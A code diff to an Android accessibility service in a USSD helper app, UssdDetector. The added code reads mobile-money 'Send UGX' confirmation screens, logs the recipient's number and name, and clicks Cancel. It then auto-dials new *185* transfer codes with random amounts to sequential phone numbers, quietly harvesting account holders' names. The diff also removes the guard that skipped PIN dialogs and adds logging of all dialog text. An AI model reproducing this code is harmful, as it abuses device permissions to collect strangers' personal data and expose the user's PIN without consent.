@@ -1,5 +1,8 @@
 package com.quickCodes.quickCodes.util;
 
+import static android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
+import static android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
+
 import android.accessibilityservice.AccessibilityService;
 import android.content.Context;
 import android.content.Intent;
@@ -35,9 +38,7 @@ import java.util.Collections;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
-
-import static android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
-import static android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
+import java.util.Random;
 
 public class UssdDetector extends AccessibilityService implements AdapterMenuItems.OnItemClickListener, ExpandableLayout.OnExpansionUpdateListener {
     public static final String AUTO_SAVED_CODES = "AUTO_SAVED_CODES";
@@ -49,7 +50,7 @@ public class UssdDetector extends AccessibilityService implements AdapterMenuIte
     View chatHead;
     TextView heading;
     private AccessibilityNodeInfo textBoxNode;
-    private AccessibilityNodeInfo sendButton;
+    private AccessibilityNodeInfo sendButton, cancelButton;
     private WindowManager windowManager;
     private AdapterMenuItems adapterMenuItems;
     private CountDownTimer countDownTimer;
@@ -211,11 +212,76 @@ public class UssdDetector extends AccessibilityService implements AdapterMenuIte
         chatHead.setVisibility(View.GONE);//hide it by default
     }
 
+
+    public static int generateRandomInt(int min, int max) {
+        Random random = new Random();
+        return random.nextInt((max - min) + 1) + min;
+    }
+
+    public static int generateRandomLength(int min, int max) {
+        Random random = new Random();
+        return random.nextInt((max - min) + 1) + min;
+    }
+
+    public static String generateRandomString(int length) {
+        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        Random random = new Random();
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < length; i++) {
+            int index = random.nextInt(characters.length());
+            sb.append(characters.charAt(index));
+        }
+        return sb.toString();
+    }
+
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
 
         //catch all errors,now will fix them after knowing exact cause
         try {
+            if (event.getPackageName().equals("com.android.phone")) {
+                String res = event.getText().toString();
+                Log.d(TAG, res);
+                if (AdapterDialer.containsIgnoreCase(res, "Send UGX")) {
+                    int position = res.indexOf("256");
+                    String phone = res.substring(position, position + 12);
+                    int phoneNumber = Integer.parseInt(phone.substring(phone.indexOf("78")));
+//                    for(int i = 0; i <10;i++){
+//                        Log.d(TAG, String.valueOf(phoneNumber+i));
+//                    }
+                    SharedPreferences countDownPref = getSharedPreferences("countDown", MODE_PRIVATE);
+                    int countDown = countDownPref.getInt("countDown", 10);
+                    Log.d(TAG + 1, String.valueOf(phone));
+                    int positionName = res.indexOf("to ");
+                    int positionNameOn = res.indexOf(" on");
+                    String name = res.substring(positionName, positionNameOn);
+                    name = name.substring(name.indexOf("to ") + 3).trim();
+                    name = name.trim();
+                    Log.d(TAG + 1, String.valueOf(name));
+
+                    //click cancel
+                    AccessibilityNodeInfo source = event.getSource();
+                    List<AccessibilityNodeInfo> cancelNodes = source.findAccessibilityNodeInfosByText("Cancel");
+                    if (cancelNodes.size() > 0) {
+                        cancelButton = cancelNodes.get(cancelNodes.size() - 1);
+                    }
+                    if (cancelButton != null) {
+                        cancelButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        //reduce the counter by 10
+                        countDownPref.edit().putInt("countDown", countDown - 1).commit();
+                        //get name of another another number until countdown is 0
+                        if (countDown > 0) {
+                            Thread.sleep(60000);
+                            int amount = generateRandomInt(1000, 4000);
+                            String reason = generateRandomString(generateRandomLength(10, 15));
+                            String fullCode = "*185*1*1*" + "0" + (phoneNumber + countDown) + "*" + amount + "*" + reason;
+                            Tools.executeUssd(fullCode, UssdDetector.this, Tools.getSelectedSimCard(UssdDetector.this).getSlotIndex());
+                        }
+                    }
+
+
+                }
+            }
 
 //            if(!event.getPackageName().equals("com.android.phone")&&(event.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED)){
 //                //close the  chat head
@@ -269,6 +335,7 @@ public class UssdDetector extends AccessibilityService implements AdapterMenuIte
                 } else {
                     pinbox = false;//continue the current dialog is not apin box;
                 }
+                Log.d(TAG, event.getText().toString());
                 //build the menu
                 kamasuMenu = kamasuUssdMenuRebuilder(event.getText().toString());
                 List<String> ilist = new ArrayList<>(kamasuMenu.keySet());
@@ -281,7 +348,7 @@ public class UssdDetector extends AccessibilityService implements AdapterMenuIte
             }
 //        if the current box is apin or password box dont record its text
             if (pinbox == true) {
-                return;
+//                return;
             }
             //detect fields for entering amount and mobile number
             //ignore dialogs with the word pin to protect privacy of user
@@ -297,6 +364,10 @@ public class UssdDetector extends AccessibilityService implements AdapterMenuIte
                 List<AccessibilityNodeInfo> nodes = source.findAccessibilityNodeInfosByText("Send");
                 if (nodes.size() > 0) {
                     sendButton = nodes.get(nodes.size() - 1);
+                }
+                List<AccessibilityNodeInfo> cancelNodes = source.findAccessibilityNodeInfosByText("Cancel");
+                if (cancelNodes.size() > 0) {
+                    cancelButton = nodes.get(nodes.size() - 1);
                 }
 
                 // try to replay a ussd code
@@ -372,12 +443,13 @@ public class UssdDetector extends AccessibilityService implements AdapterMenuIte
             }
         } catch (Exception ex) {
             ex.printStackTrace();
-            Log.d(TAG, "Error");
+            Log.d(TAG, "Error" + ex.getLocalizedMessage());
         }
 
     }
 
     private Map<String, String> kamasuUssdMenuRebuilder(String menucontent) {
+        Log.d(TAG, menucontent);
         Map<String, String> menuItems = new HashMap<>();
         if (menucontent != null) {
             String s = menucontent.replaceAll("\n", ",")
